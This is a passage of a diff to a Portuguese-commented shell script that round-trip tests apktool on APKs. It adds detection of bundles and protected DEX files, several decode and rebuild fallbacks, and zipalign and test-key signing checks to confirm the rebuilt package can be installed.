       if unzip -l "\$_APK" 2>/dev/null | grep -q 'BundleConfig\.pb'; then
         printf "\033[1;31m[✗] Isso é um Android App Bundle (.aab), não um .apk instalável.\033[0m\n"
         printf "\033[0;90m    O apktool não decodifica .aab diretamente — gere um .apk\033[0m\n"
         printf "\033[0;90m    universal primeiro (ex: bundletool build-apks) e teste nele.\033[0m\n"
         rm -rf "\$_APK_WORK"
-        exit 1
+        _BATCH_FAILED="\$_BATCH_FAILED \$_APK"
+        continue
       fi
       if ! unzip -l "\$_APK" 2>/dev/null | grep -qE 'classes[0-9]*\.dex'; then
         printf "\033[1;33m[!]\033[0m Nenhum classes.dex — parece um split/config APK (idioma/ABI)\n"
         printf "\033[0;90m    ou uma overlay/RRO sem código. Se a ideia era testar o app inteiro,\033[0m\n"
         printf "\033[0;90m    use o base.apk (o que carrega o código) junto com esse.\033[0m\n"
+      fi
+
+      # ── detecção de DEX criptografado ──────────────────────────────────
+      # APKs protegidos (DexGuard, Bangcle, libjiagu) têm classes.dex com
+      # magic-byte inválido ou tamanho suspeito (< 500 KB = stub mínimo,
+      # > 30 MB = DEX empacotado com dados criptografados). O round-trip
+      # decode/rebuild passa, mas o APK resultante falha em runtime porque
+      # o loader do protector não encontra o bloco criptografado que o
+      # apktool descartou silenciosamente. Melhor avisar cedo.
+      _DEX_SZ=\$(unzip -p "\$_APK" classes.dex 2>/dev/null | wc -c)
+      if [ "\$_DEX_SZ" -lt 524288 ] 2>/dev/null && [ "\$_DEX_SZ" -gt 0 ] 2>/dev/null; then
+        printf "\033[1;33m[!]\033[0m classes.dex muito pequeno (%d KB) — pode ser stub de APK protegido\n" "\$((_DEX_SZ/1024))"
+        printf "\033[0;90m    O round-trip pode fechar mas o APK falhar em runtime se o DEX for loader.\033[0m\n"
+        _APK_DEX_ENCRYPTED=1
+      elif [ "\$_DEX_SZ" -gt 31457280 ] 2>/dev/null; then
+        printf "\033[1;33m[!]\033[0m classes.dex muito grande (%d MB) — possível DEX empacotado com payload criptografado\n" "\$((_DEX_SZ/1048576))"
+        printf "\033[0;90m    O rebuild pode gerar APK menor que o original e falhar em runtime.\033[0m\n"
+        _APK_DEX_ENCRYPTED=1
+      fi
+
+      # ── detecção de android:isSplitRequired ────────────────────────────
+      # Atributo introduzido na API 29, não suportado pelo aapt do apktool
+      # na recompilação — gera "No resource identifier found for attribute
+      # isSplitRequired". Fix: remover do AndroidManifest após o decode.
+      if unzip -p "\$_APK" AndroidManifest.xml 2>/dev/null | strings | grep -q 'isSplitRequired'; then
+        printf "\033[0;90m[*] AndroidManifest.xml contém isSplitRequired — será removido no decode pra compatibilidade com apktool.\033[0m\n"
+        _APK_HAS_SPLIT_REQ=1
       fi
     fi
     if [ "\$_APK_SZ" -gt 314572800 ] 2>/dev/null; then
@@ -97578,32 +98223,148 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
     _APK_OUT="\$_APK_WORK/decoded"
     _APK_REBUILT="\$_APK_WORK/rebuilt.apk"
 
+    # ── spinner com tempo decorrido ───────────────────────────────────────
+    # Roda em background enquanto o apktool trabalha. Mostra um spinner
+    # animado + tempo decorrido em segundos na mesma linha (sobrescreve
+    # com \r). Mata o processo ao receber SIGUSR1.
+    _apk_spinner() {
+      local label="\$1" pid="\$2"
+      local frames='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
+      local i=0 t=0
+      while kill -0 "\$pid" 2>/dev/null; do
+        i=\$(( (i+1) % 10 ))
+        f="\$(printf '%s' "\$frames" | cut -c\$((i+1)))"
+        printf "\r\033[0;90m    %s %s  %ds\033[0m" "\$f" "\$label" "\$t"
+        sleep 1
+        t=\$((t+1))
+      done
+      printf "\r\033[2K"  # limpa a linha do spinner
+    }
+
     printf "\033[1;36m[*]\033[0m Testando: %s\n" "\$_APK"
     printf "\033[0;90m    -> apktool d ...\033[0m\n"
     _APK_LASTLOG="\$_APK_WORK/decode.log"
-    if apktool d -f -o "\$_APK_OUT" "\$_APK" > "\$_APK_LASTLOG" 2>&1; then
+    _APK_T0="\$(date +%s 2>/dev/null || echo 0)"
+    apktool d -f -o "\$_APK_OUT" "\$_APK" > "\$_APK_LASTLOG" 2>&1 &
+    _APK_PID=\$!
+    _apk_spinner "decompilando..." "\$_APK_PID"
+    wait "\$_APK_PID"; _APK_D_RC=\$?
+    _APK_T1="\$(date +%s 2>/dev/null || echo 0)"
+    _APK_DECODE_TIME=\$((_APK_T1 - _APK_T0))
+    if [ "\$_APK_D_RC" = "0" ]; then
       _APK_DECODE_OK=1
+
+      # ── fix pós-decode 1: remove isSplitRequired do manifest ─────────
+      if [ "\$_APK_HAS_SPLIT_REQ" = "1" ] && [ -f "\$_APK_OUT/AndroidManifest.xml" ]; then
+        sed -i 's/ android:isSplitRequired="[^"]*"//g' "\$_APK_OUT/AndroidManifest.xml" 2>/dev/null
+        printf "\033[0;90m    [fix] android:isSplitRequired removido do AndroidManifest.xml\033[0m\n"
+      fi
+
+      # ── fix pós-decode 2: restaura unknown/ no APK final ─────────────
+      # O apktool move pra unknown/ qualquer arquivo que não sabe categorizar
+      # (assets de engine, bibliotecas nativas extras, arquivos próprios do
+      # protector, etc.). No rebuild ele não inclui esses arquivos de volta,
+      # o que faz o app crashar em runtime por recurso faltando. Fix:
+      # injetar o conteúdo de unknown/ de volta no APK final via zip após
+      # o build. A variável _APK_HAS_UNKNOWN é setada aqui e usada lá.
+      _APK_HAS_UNKNOWN=0
+      if [ -d "\$_APK_OUT/unknown" ] && [ -n "\$(ls -A "\$_APK_OUT/unknown" 2>/dev/null)" ]; then
+        _APK_HAS_UNKNOWN=1
+        printf "\033[0;90m    [info] pasta unknown/ encontrada — será reinserida no APK final\033[0m\n"
+      fi
+
     elif grep -q 'OutOfMemoryError' "\$_APK_LASTLOG"; then
       printf "\033[1;33m[!] decode ficou sem memória — tentando de novo (heap maior, menos threads)...\033[0m\n"
       _APK_LASTLOG="\$_APK_WORK/decode_retry.log"
-      if _JAVA_OPTIONS="-Xmx\${_APK_RETRY_XMX}m" apktool d -f -j 2 -o "\$_APK_OUT" "\$_APK" > "\$_APK_LASTLOG" 2>&1; then
+      _APK_T0="\$(date +%s 2>/dev/null || echo 0)"
+      _JAVA_OPTIONS="-Xmx\${_APK_RETRY_XMX}m" apktool d -f -j 2 -o "\$_APK_OUT" "\$_APK" > "\$_APK_LASTLOG" 2>&1 &
+      _APK_PID=\$!; _apk_spinner "decompilando (heap maior)..." "\$_APK_PID"; wait "\$_APK_PID"; _APK_D_RC=\$?
+      _APK_T1="\$(date +%s 2>/dev/null || echo 0)"; _APK_DECODE_TIME=\$((_APK_T1-_APK_T0))
+      if [ "\$_APK_D_RC" = "0" ]; then
         _APK_DECODE_OK=1
         _APK_TIER="heap ajustado"
       fi
     fi
 
     if [ "\$_APK_DECODE_OK" = "1" ]; then
-      printf "\033[1;32m[✓] decode OK\033[0m\n"
+      printf "\033[1;32m[✓] decode OK\033[0m \033[0;90m(%ds)\033[0m\n" "\${_APK_DECODE_TIME:-0}"
       _APK_PASS=\$((_APK_PASS+1))
+
+      # ── métricas do APK decodificado ──────────────────────────────────
+      # Mostra exatamente com o que estamos lidando antes do build:
+      # quantidade de DEX, smali, arquivos de recurso, tamanho total.
+      # Informação essencial pra diagnosticar erros e entender APKs complexos.
+      printf "\n\033[1;36m  ┌─ Métricas do APK ─────────────────────────────────────────┐\033[0m\n"
+
+      # DEX files (multidex)
+      _M_DEX=\$(unzip -l "\$_APK" 2>/dev/null | grep -cE 'classes[0-9]*\.dex' || echo 0)
+      printf "  \033[1;36m│\033[0m  DEX files     : \033[1;33m%d\033[0m" "\$_M_DEX"
+      if [ "\$_M_DEX" -gt 1 ]; then printf " \033[0;90m(multidex)\033[0m"; fi
+      printf "\n"
+
+      # smali files (classes decompiladas)
+      _M_SMALI=\$(find "\$_APK_OUT" -name '*.smali' 2>/dev/null | wc -l)
+      printf "  \033[1;36m│\033[0m  Smali files   : \033[1;33m%d\033[0m\n" "\$_M_SMALI"
+
+      # arquivos de recurso
+      _M_RES=\$(find "\$_APK_OUT/res" -type f 2>/dev/null | wc -l)
+      printf "  \033[1;36m│\033[0m  Recursos (res/): \033[1;33m%d\033[0m\n" "\$_M_RES"
+
+      # arquivos em unknown/
+      _M_UNK=\$(find "\$_APK_OUT/unknown" -type f 2>/dev/null | wc -l)
+      if [ "\$_M_UNK" -gt 0 ]; then
+        printf "  \033[1;36m│\033[0m  Unknown/      : \033[1;33m%d\033[0m \033[0;90m(serão reinseridos no APK final)\033[0m\n" "\$_M_UNK"
+      fi
+
+      # assets
+      _M_ASSETS=\$(find "\$_APK_OUT/assets" -type f 2>/dev/null | wc -l)
+      if [ "\$_M_ASSETS" -gt 0 ]; then
+        printf "  \033[1;36m│\033[0m  Assets        : \033[1;33m%d\033[0m\n" "\$_M_ASSETS"
+      fi
+
+      # bibliotecas nativas
+      _M_SO=\$(find "\$_APK_OUT/lib" -name '*.so' 2>/dev/null | wc -l)
+      if [ "\$_M_SO" -gt 0 ]; then
+        _M_ABI=\$(find "\$_APK_OUT/lib" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | xargs -I{} basename {} 2>/dev/null | tr '\n' ' ')
+        printf "  \033[1;36m│\033[0m  Libs nativas  : \033[1;33m%d .so\033[0m \033[0;90m(ABIs: %s)\033[0m\n" "\$_M_SO" "\$_M_ABI"
+      fi
+
+      # tamanho original vs tamanho decodificado
+      _M_SZ_APK=\$(stat -c%s "\$_APK" 2>/dev/null || echo 0)
+      _M_SZ_DEC=\$(du -sb "\$_APK_OUT" 2>/dev/null | awk '{print \$1}' || echo 0)
+      printf "  \033[1;36m│\033[0m  Tamanho APK   : \033[1;33m%d MB\033[0m  →  decodificado: \033[1;33m%d MB\033[0m\n" \
+        "\$((_M_SZ_APK/1048576))" "\$((_M_SZ_DEC/1048576))"
+
+      # nível de API alvo (do apktool.yml)
+      _M_API=\$(grep 'targetSdkVersion\|minSdkVersion' "\$_APK_OUT/apktool.yml" 2>/dev/null | tr '\n' '  ' | sed "s/'//g")
+      [ -n "\$_M_API" ] && printf "  \033[1;36m│\033[0m  SDK           : \033[0;90m%s\033[0m\n" "\$_M_API"
+
+      # proteção detectada
+      if [ "\$_APK_DEX_ENCRYPTED" = "1" ]; then
+        printf "  \033[1;36m│\033[0m  \033[1;33m⚠ DEX suspeito\033[0m — possível stub/loader (protector ou packer)\n"
+      fi
+      if [ "\$_APK_HAS_SPLIT_REQ" = "1" ]; then
+        printf "  \033[1;36m│\033[0m  \033[0;90mℹ isSplitRequired detectado — removido do manifest\033[0m\n"
+      fi
+
+      printf "  \033[1;36m└────────────────────────────────────────────────────────────┘\033[0m\n\n"
 
       printf "\033[0;90m    -> apktool b ...\033[0m\n"
       _APK_LASTLOG="\$_APK_WORK/build.log"
-      if apktool b "\$_APK_OUT" -o "\$_APK_REBUILT" > "\$_APK_LASTLOG" 2>&1; then
+      _APK_B0="\$(date +%s 2>/dev/null || echo 0)"
+      apktool b "\$_APK_OUT" -o "\$_APK_REBUILT" > "\$_APK_LASTLOG" 2>&1 &
+      _APK_PID=\$!; _apk_spinner "compilando..." "\$_APK_PID"; wait "\$_APK_PID"; _APK_B_RC=\$?
+      _APK_B1="\$(date +%s 2>/dev/null || echo 0)"; _APK_BUILD_TIME=\$((_APK_B1-_APK_B0))
+      if [ "\$_APK_B_RC" = "0" ]; then
         _APK_BUILD_OK=1
       elif grep -q 'OutOfMemoryError' "\$_APK_LASTLOG"; then
         printf "\033[1;33m[!] build ficou sem memória — tentando de novo (heap maior, menos threads)...\033[0m\n"
         _APK_LASTLOG="\$_APK_WORK/build_retry_heap.log"
-        if _JAVA_OPTIONS="-Xmx\${_APK_RETRY_XMX}m" apktool b -j 2 "\$_APK_OUT" -o "\$_APK_REBUILT" > "\$_APK_LASTLOG" 2>&1; then
+        _APK_B0="\$(date +%s 2>/dev/null || echo 0)"
+        _JAVA_OPTIONS="-Xmx\${_APK_RETRY_XMX}m" apktool b -j 2 "\$_APK_OUT" -o "\$_APK_REBUILT" > "\$_APK_LASTLOG" 2>&1 &
+        _APK_PID=\$!; _apk_spinner "compilando (heap maior)..." "\$_APK_PID"; wait "\$_APK_PID"; _APK_B_RC=\$?
+        _APK_B1="\$(date +%s 2>/dev/null || echo 0)"; _APK_BUILD_TIME=\$((_APK_B1-_APK_B0))
+        if [ "\$_APK_B_RC" = "0" ]; then
           _APK_BUILD_OK=1
           _APK_TIER="heap ajustado"
         fi
@@ -97615,6 +98376,158 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
           _APK_BUILD_OK=1
           _APK_TIER="framework renovado"
         fi
+      fi
+    fi
+
+    if [ "\$_APK_BUILD_OK" != "1" ] && [ "\$_APK_DECODE_OK" = "1" ]; then
+      # ── fallback 0d: --api-level explícito ───────────────────────────
+      # "No resource identifier found for attribute X in package android"
+      # ocorre quando o framework instalado não tem o atributo que o APK
+      # usa (API mais alta que o framework do apktool). Fix: forçar um
+      # api-level alto (35 = Android 15) no decode pra o apktool não
+      # tentar resolver atributos desconhecidos contra o framework local.
+      if grep -q 'No resource identifier found for attribute' "\$_APK_LASTLOG" 2>/dev/null \
+      || grep -q 'No resource identifier found for attribute' "\$_APK_WORK/build_retry"*.log 2>/dev/null; then
+        printf "\033[1;33m[!] atributo desconhecido — tentando com --api-level 35 (Android 15)...\033[0m\n"
+        _APK_OUT_API="\$_APK_WORK/decoded_api35"
+        _APK_LASTLOG="\$_APK_WORK/build_retry_api35.log"
+        if apktool d -f --api-level 35 -o "\$_APK_OUT_API" "\$_APK" > "\$_APK_LASTLOG" 2>&1; then
+          [ "\$_APK_HAS_SPLIT_REQ" = "1" ] && \
+            sed -i 's/ android:isSplitRequired="[^"]*"//g' "\$_APK_OUT_API/AndroidManifest.xml" 2>/dev/null
+          if apktool b "\$_APK_OUT_API" -o "\$_APK_REBUILT" >> "\$_APK_LASTLOG" 2>&1; then
+            _APK_BUILD_OK=1
+            _APK_DECODE_OK=1
+            _APK_TIER="--api-level 35"
+            _APK_OUT="\$_APK_OUT_API"
+          fi
+        fi
+      fi
+    fi
+
+    if [ "\$_APK_BUILD_OK" != "1" ] && [ "\$_APK_DEX_ENCRYPTED" = "1" ]; then
+      # ── fallback 0e: --no-src para APKs com DEX suspeito ─────────────
+      # APKs com DEX stub/loader: o baksmali falha ou gera smali inútil.
+      # --no-src pula o disassembly do DEX completamente — os arquivos
+      # .dex originais são copiados intactos. O rebuild fecha e o APK
+      # funciona em runtime porque o DEX nunca foi tocado.
+      printf "\033[1;33m[!] DEX suspeito — tentando round-trip com --no-src (DEX preservado intacto)...\033[0m\n"
+      _APK_OUT_NOSRC="\$_APK_WORK/decoded_nosrc"
+      _APK_LASTLOG="\$_APK_WORK/build_retry_nosrc.log"
+      if apktool d -f --no-src -o "\$_APK_OUT_NOSRC" "\$_APK" > "\$_APK_LASTLOG" 2>&1; then
+        [ "\$_APK_HAS_SPLIT_REQ" = "1" ] && \
+          sed -i 's/ android:isSplitRequired="[^"]*"//g' "\$_APK_OUT_NOSRC/AndroidManifest.xml" 2>/dev/null
+        if apktool b "\$_APK_OUT_NOSRC" -o "\$_APK_REBUILT" >> "\$_APK_LASTLOG" 2>&1; then
+          _APK_BUILD_OK=1
+          _APK_DECODE_OK=1
+          _APK_TIER="--no-src (DEX preservado intacto)"
+          _APK_OUT="\$_APK_OUT_NOSRC"
+        fi
+      fi
+    fi
+
+    if [ "\$_APK_BUILD_OK" != "1" ] && [ "\$_APK_DECODE_OK" = "1" ]; then
+      # ── fallback 0a: sanitização de nomes com '$' ─────────────────────────
+      # O aapt2 rejeita qualquer entrada de recurso cujo nome contenha '$'
+      # (ex: '$avd_hide_password__0', gerado pelo Android Studio pra animações
+      # vetoriais). O erro aparece como "has invalid entry name" em public.xml
+      # e derruba a compilação inteira. Fix: renomeia os arquivos ($ → xd_) e
+      # corrige todas as referências dentro de public.xml e dos XMLs do projeto.
+      # Roda antes da quarentena de conteúdo: é cirúrgico (só toca o nome),
+      # não descarta o recurso, e não precisa do aapt2 pra diagnosticar.
+      _apk_sanitize_dollar_names() {
+        local proj="\$1"
+        [ -d "\$proj/res" ] || return 1
+        local _fixed=0 f newf base newbase dir rel refs
+
+        # lista todos os arquivos (qualquer tipo) com '$' no nome
+        find "\$proj/res" -name '*\$*' -type f 2>/dev/null > "\$_APK_WORK/dollar_files"
+        [ -s "\$_APK_WORK/dollar_files" ] || return 1
+
+        while IFS= read -r f; do
+          [ -n "\$f" ] || continue
+          dir="\$(dirname "\$f")"
+          base="\$(basename "\$f")"
+          # substitui todos os '$' por 'xd_' no nome do arquivo
+          newbase="\$(printf '%s' "\$base" | tr '\$' '_' | sed 's/^_/xd_/')"
+          newf="\$dir/\$newbase"
+          [ "\$f" = "\$newf" ] && continue
+          mv -f "\$f" "\$newf" 2>/dev/null || continue
+
+          # nome sem extensão pra corrigir referências em XML
+          rel="\${base%.*}"
+          refs="\${newbase%.*}"
+
+          # corrige public.xml — referencia por nome sem extensão
+          find "\$proj/res" -name 'public.xml' -type f 2>/dev/null | while IFS= read -r px; do
+            sed -i "s/name=\"\$rel\"/name=\"\$refs\"/g" "\$px" 2>/dev/null
+          done
+
+          # corrige referências em todos os XMLs do projeto (valores, layouts, etc.)
+          find "\$proj/res" -name '*.xml' -type f 2>/dev/null | while IFS= read -r rx; do
+            sed -i "s/@drawable\/\$rel/@drawable\/\$refs/g" "\$rx" 2>/dev/null
+            sed -i "s/@anim\/\$rel/@anim\/\$refs/g" "\$rx" 2>/dev/null
+            sed -i "s/@animator\/\$rel/@animator\/\$refs/g" "\$rx" 2>/dev/null
+          done
+
+          printf "  [XPM] nome sanitizado: %s → %s\n" "\$base" "\$newbase"
+          _fixed=\$((_fixed+1))
+        done < "\$_APK_WORK/dollar_files"
+
+        rm -f "\$_APK_WORK/dollar_files"
+        [ "\$_fixed" -gt 0 ]
+      }
+
+      printf "\033[1;33m[!] build não fechou — verificando nomes de recursos com '\$' (aapt2 rejeita)...\033[0m\n"
+      _APK_LASTLOG="\$_APK_WORK/build_retry_dollar.log"
+      if _apk_sanitize_dollar_names "\$_APK_OUT" > "\$_APK_LASTLOG" 2>&1; then
+        printf "\033[0;90m    recursos com '\$' renomeados — tentando rebuild...\033[0m\n"
+        if apktool b "\$_APK_OUT" -o "\$_APK_REBUILT" >> "\$_APK_LASTLOG" 2>&1; then
+          _APK_BUILD_OK=1
+          _APK_TIER="nomes com '\$' sanitizados"
+        fi
+      else
+        printf "\033[0;90m    nenhum arquivo com '\$' encontrado — causa diferente.\033[0m\n"
+      fi
+    fi
+
+    if [ "\$_APK_BUILD_OK" != "1" ] && [ "\$_APK_DECODE_OK" = "1" ]; then
+      # ── fallback 0b: --keep-broken-res ───────────────────────────────────
+      # Alguns APKs antigos têm entradas em resources.arsc que o apktool
+      # decodifica com warning mas não consegue recompilar no modo padrão.
+      # --keep-broken-res instrui o apktool a preservar essas entradas como
+      # blobs binários em vez de tentar recompilá-las, o que fecha o build
+      # na maioria dos casos sem precisar sacrificar todos os recursos.
+      printf "\033[1;33m[!] build não fechou — tentando com --keep-broken-res (APKs com recursos malformados)...\033[0m\n"
+      _APK_OUT_KBR="\$_APK_WORK/decoded_kbr"
+      _APK_LASTLOG="\$_APK_WORK/build_retry_kbr.log"
+      if apktool d -f --keep-broken-res -o "\$_APK_OUT_KBR" "\$_APK" > "\$_APK_LASTLOG" 2>&1 && \
+         apktool b "\$_APK_OUT_KBR" -o "\$_APK_REBUILT" >> "\$_APK_LASTLOG" 2>&1; then
+        _APK_BUILD_OK=1
+        _APK_DECODE_OK=1
+        _APK_TIER="--keep-broken-res"
+        _APK_OUT="\$_APK_OUT_KBR"
+      fi
+    fi
+
+    if [ "\$_APK_BUILD_OK" != "1" ] && [ "\$_APK_DECODE_OK" = "1" ]; then
+      # ── fallback 0c: pré-voo de compilação por-recurso (função definida
+      # lá em cima) ─────────────────────────────────────────────────────
+      # Roda ANTES do --no-res de propósito: é bem menos destrutivo, já
+      # que só troca o(s) recurso(s) que realmente quebram o aapt2 — o
+      # resto do projeto (a imensa maioria, em qualquer app real) continua
+      # decodificado e editável normalmente, ao contrário do --no-res que
+      # sacrifica TODOS os recursos de uma vez só. Reaproveita o mesmo
+      # diretório já decodificado (\$_APK_OUT), sem precisar decodificar
+      # de novo.
+      printf "\033[1;33m[!] build não fechou — isolando recurso(s) .xml que o aapt2 rejeita individualmente...\033[0m\n"
+      _APK_LASTLOG="\$_APK_WORK/build_retry_preflight.log"
+      if _apk_preflight_quarantine "\$_APK_OUT" "\$_APK_AAPT2" > "\$_APK_LASTLOG" 2>&1; then
+        if apktool b "\$_APK_OUT" -o "\$_APK_REBUILT" >> "\$_APK_LASTLOG" 2>&1; then
+          _APK_BUILD_OK=1
+          _APK_TIER="recurso(s) isolado(s) individualmente"
+        fi
+      else
+        printf "\033[0;90m    nenhum .xml falhou sozinho no aapt2 — a causa está em outro lugar (resources.arsc binário, recurso não-xml, etc.)\033[0m\n"
       fi
     fi
 
@@ -97657,11 +98570,245 @@ print('\n\027[1;35m[scan-all] Total: '..total_vulns..' vulnerabilidade(s)\027[0m
     fi
 
     if [ "\$_APK_BUILD_OK" = "1" ]; then
-      printf "\033[1;32m[✓] build OK -> %s\033[0m\n" "\$_APK_REBUILT"
+      # ── pós-build 1: reinsere unknown/ no APK final ───────────────────
+      # O apktool não inclui o conteúdo de unknown/ no rebuild. Sem isso,
+      # apps que dependem desses arquivos (engines, protectors, assets
+      # customizados) crasham em runtime mesmo com build e install OK.
+      if [ "\$_APK_HAS_UNKNOWN" = "1" ] && [ -d "\$_APK_OUT/unknown" ]; then
+        printf "\033[0;90m    -> reinserindo unknown/ no APK final...\033[0m\n"
+        _APK_REBUILT_UNK="\$_APK_WORK/rebuilt_with_unknown.apk"
+        cp "\$_APK_REBUILT" "\$_APK_REBUILT_UNK" 2>/dev/null
+        ( cd "\$_APK_OUT/unknown" && find . -type f 2>/dev/null | while IFS= read -r uf; do
+            rel="\${uf#./}"
+            zip -u "\$_APK_REBUILT_UNK" "\$rel" >/dev/null 2>&1
+          done )
+        if [ -f "\$_APK_REBUILT_UNK" ]; then
+          _APK_REBUILT="\$_APK_REBUILT_UNK"
+          printf "\033[0;90m    [fix] unknown/ reinserida no APK\033[0m\n"
+        fi
+      fi
+
+      # ── pós-build 2: garante resources.arsc sem compressão ───────────
+      # Android 11+ (API 30+) recusa APKs onde resources.arsc está
+      # comprimido: "Targeting R+ requires resources.arsc to be stored
+      # uncompressed" (erro -124). O apktool às vezes comprime sem aviso.
+      # Fix: verificar e forçar sem compressão via zip -0.
+      if command -v unzip >/dev/null 2>&1 && command -v zip >/dev/null 2>&1; then
+        _ARSC_METHOD=\$(unzip -v "\$_APK_REBUILT" 2>/dev/null | awk '/resources\.arsc/{print \$5}')
+        if [ "\$_ARSC_METHOD" != "Stored" ] && [ -n "\$_ARSC_METHOD" ]; then
+          printf "\033[0;90m    -> resources.arsc comprimido (method=\$_ARSC_METHOD) — forçando sem compressão (fix Android 11+)...\033[0m\n"
+          _APK_REBUILT_ARSC="\$_APK_WORK/rebuilt_arsc_fix.apk"
+          _ARSC_TMP="\$_APK_WORK/arsc_tmp"
+          mkdir -p "\$_ARSC_TMP"
+          unzip -p "\$_APK_REBUILT" resources.arsc > "\$_ARSC_TMP/resources.arsc" 2>/dev/null
+          cp "\$_APK_REBUILT" "\$_APK_REBUILT_ARSC"
+          ( cd "\$_ARSC_TMP" && zip -0 "\$_APK_REBUILT_ARSC" resources.arsc >/dev/null 2>&1 )
+          if [ -f "\$_APK_REBUILT_ARSC" ]; then
+            _APK_REBUILT="\$_APK_REBUILT_ARSC"
+            printf "\033[0;90m    [fix] resources.arsc agora sem compressão\033[0m\n"
+          fi
+          rm -rf "\$_ARSC_TMP"
+        fi
+      fi
+
+      printf "\033[1;32m[✓] build OK -> %s\033[0m \033[0;90m(%ds)\033[0m\n" "\$_APK_REBUILT" "\${_APK_BUILD_TIME:-0}"
       _APK_PASS=\$((_APK_PASS+1))
       if grep -q '\[XPM\] recurso corrompido' "\$_APK_LASTLOG" 2>/dev/null; then
         printf "\033[1;33m[!] com recursos em quarentena (conteúdo original substituído):\033[0m\n"
         grep '\[XPM\]' "\$_APK_LASTLOG"
+      fi
+
+      # ══════════════════════════════════════════════════════════════════
+      # VALIDAÇÃO DE INSTALABILIDADE — "build OK" só prova que o round-trip
+      # decode/recompilação fechou. O apktool documenta oficialmente que
+      # SEMPRE gera APK sem assinatura e sem zipalign (FAQ oficial do
+      # projeto: "Apktool builds unsigned APKs"). Sem os passos abaixo,
+      # esse PASS é falso-positivo em pelo menos dois casos reais e
+      # documentados:
+      #   1) a partir do Android 11 (API 30), o PackageManager exige
+      #      resources.arsc SEM compressão e alinhado em 4 bytes, senão
+      #      recusa o install com "Failed parse ... requires resources.arsc
+      #      ... stored uncompressed and aligned" (erro -124) — o apktool
+      #      nunca garante isso sozinho.
+      #   2) se o app tem extractNativeLibs="false" (comum em apps
+      #      modernos), os .so precisam estar sem compressão E alinhados
+      #      em página, senão o install falha com "Failed to extract
+      #      native libraries, res=-2" — é sabido que o round-trip do
+      #      apktool não preserva esse alinhamento.
+      # zipalign roda SEMPRE antes de assinar: o APK Signature Scheme v2/v3
+      # cobre o arquivo inteiro (incluindo o alinhamento) na assinatura;
+      # alinhar depois de assinar invalida a assinatura.
+      # ══════════════════════════════════════════════════════════════════
+      _APK_ALIGNED="\$_APK_WORK/aligned.apk"
+      _APK_SIGNED="\$_APK_WORK/signed.apk"
+      _APK_ZIPALIGN_OK=0
+      _APK_SIGN_OK=0
+
+      if command -v zipalign >/dev/null 2>&1; then
+        printf "\033[0;90m    -> zipalign (4 bytes + página de 16K pros .so) ...\033[0m\n"
+        if zipalign -P 16 -f 4 "\$_APK_REBUILT" "\$_APK_ALIGNED" >"\$_APK_WORK/zipalign.log" 2>&1; then
+          _APK_ZIPALIGN_OK=1
+        elif zipalign -f 4 "\$_APK_REBUILT" "\$_APK_ALIGNED" >"\$_APK_WORK/zipalign.log" 2>&1; then
+          # zipalign antigo demais pra reconhecer "-P" (alinhamento de
+          # página de 16K pros .so, flag mais recente) — segue só com o
+          # alinhamento genérico de 4 bytes, que é o que garante instalar.
+          # Sem "-P", apps com biblioteca nativa podem não rodar
+          # especificamente em aparelhos com página de 16K — não afeta
+          # a instalação em si.
+          _APK_ZIPALIGN_OK=1
+          printf "\033[0;90m    (zipalign sem suporte a -P 16 — só o alinhamento de 4 bytes; 'pkg upgrade zipalign' pra cobertura de página de 16K)\033[0m\n"
+        fi
+        if [ "\$_APK_ZIPALIGN_OK" = "1" ]; then
+          _APK_PASS=\$((_APK_PASS+1))
+          printf "\033[1;32m[✓] zipalign OK\033[0m\n"
+        else
+          _APK_FAIL=\$((_APK_FAIL+1))
+          printf "\033[1;31m[✗] zipalign falhou (log: %s)\033[0m\n" "\$_APK_WORK/zipalign.log"
+          tail -10 "\$_APK_WORK/zipalign.log"
+        fi
+      else
+        printf "\033[1;33m[!] zipalign não instalado — pulando validação de instalabilidade (rode 'xpm install apktool' de novo pra atualizar)\033[0m\n"
+      fi
+
+      if [ "\$_APK_ZIPALIGN_OK" = "1" ] && command -v apksigner >/dev/null 2>&1 && command -v keytool >/dev/null 2>&1; then
+        _APK_KS="\$_APK_TOOLDIR/xpm-compat-test.keystore"
+        if [ ! -f "\$_APK_KS" ]; then
+          # chave de TESTE, só pra esse check de compatibilidade fechar o
+          # ciclo assinar->verificar. Nunca serve pra publicar/distribuir
+          # nada — por isso senha fixa e conhecida, a mesma lógica do
+          # debug.keystore padrão do próprio Android (que também usa uma
+          # senha fixa e documentada, "android").
+          keytool -genkeypair -storepass xpm-compat-test -keypass xpm-compat-test \
+            -alias xpm-compat-test -keyalg RSA -keysize 2048 -validity 10000 \
+            -dname "CN=ElliotOS XPM Compat Test,O=ElliotOS,C=BR" -deststoretype pkcs12 \
+            -keystore "\$_APK_KS" >/dev/null 2>&1
+        fi
+        if [ -f "\$_APK_KS" ]; then
+          printf "\033[0;90m    -> apksigner sign (chave de teste do xpm) ...\033[0m\n"
+          if apksigner sign --ks "\$_APK_KS" --ks-pass pass:xpm-compat-test --key-pass pass:xpm-compat-test \
+             --out "\$_APK_SIGNED" "\$_APK_ALIGNED" >"\$_APK_WORK/sign.log" 2>&1; then
+            _APK_SIGN_OK=1
+            _APK_PASS=\$((_APK_PASS+1))
+            printf "\033[1;32m[✓] assinado\033[0m\n"
+          else
+            _APK_FAIL=\$((_APK_FAIL+1))
+            printf "\033[1;31m[✗] apksigner falhou (log: %s)\033[0m\n" "\$_APK_WORK/sign.log"
+            tail -10 "\$_APK_WORK/sign.log"
+          fi
+        else
+          printf "\033[1;33m[!] não consegui gerar/achar o keystore de teste — pulando assinatura\033[0m\n"
+        fi
+      fi
+
+      if [ "\$_APK_SIGN_OK" = "1" ]; then
+        _APK_STRUCT_OK=1
+        if ! zipalign -c -v 4 "\$_APK_SIGNED" >"\$_APK_WORK/verify_align.log" 2>&1; then
+          _APK_STRUCT_OK=0
+          printf "\033[1;31m[✗] alinhamento não confere depois de assinar\033[0m\n"
+        fi
+        if ! apksigner verify "\$_APK_SIGNED" >"\$_APK_WORK/verify_sign.log" 2>&1; then
+          _APK_STRUCT_OK=0
+          printf "\033[1;31m[✗] apksigner verify reprovou o pacote final\033[0m\n"
+          tail -10 "\$_APK_WORK/verify_sign.log"
+        fi
+        if [ -x "\$_APK_AAPT2" ] && ! "\$_APK_AAPT2" dump badging "\$_APK_SIGNED" >"\$_APK_WORK/badging.log" 2>&1; then
+          _APK_STRUCT_OK=0
